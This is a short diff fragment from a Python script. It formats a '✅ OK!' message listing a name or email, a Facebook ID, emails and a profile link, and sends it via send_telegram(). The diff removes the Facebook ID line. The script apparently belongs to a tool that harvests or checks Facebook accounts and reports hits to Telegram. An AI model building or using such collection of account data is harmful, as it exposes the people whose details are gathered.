@@ -77,7 +77,6 @@ while True:
 	
 	    msg = f"""✅ OK!
 Name or email : {name}
-ID Fecbook : {user_id}
 Emails : {', '.join(emails)}
  Link : https://www.facebook.com/{user_id}"""
 	    send_telegram(msg)
